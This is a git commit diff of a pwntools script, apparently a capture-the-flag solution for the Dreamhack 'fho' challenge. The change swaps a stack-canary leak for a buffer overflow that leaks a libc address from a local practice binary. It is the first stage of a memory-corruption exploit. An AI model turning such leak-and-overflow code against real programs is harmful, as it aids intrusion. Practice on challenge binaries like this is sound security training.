1887875ff89e7425b56155a0bc0f6f60ea9a25a4
Brian Lee <hibrian827@gmail.com>
2024-07-28 15:34:00 +0900

    solving fho

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -6,11 +6,8 @@ rem = process("./fho/problem/fho")
 elf = ELF("./fho/problem/fho")
 lib = ELF("./fho/problem/libc-2.27.so")
 
-payload = b'A' * 0x49
+payload = b'A' * 0x48
 rem.sendafter(b'Buf: ', payload)
 rem.recvuntil(payload)
-canary = u64(rem.recvn(7) + b'\x00')
-print(p64(canary))
-
-
-payload = b'A' * 0x56
+libcMain_addr = u64(rem.recvn(8))
+print(p64(libcMain_addr))
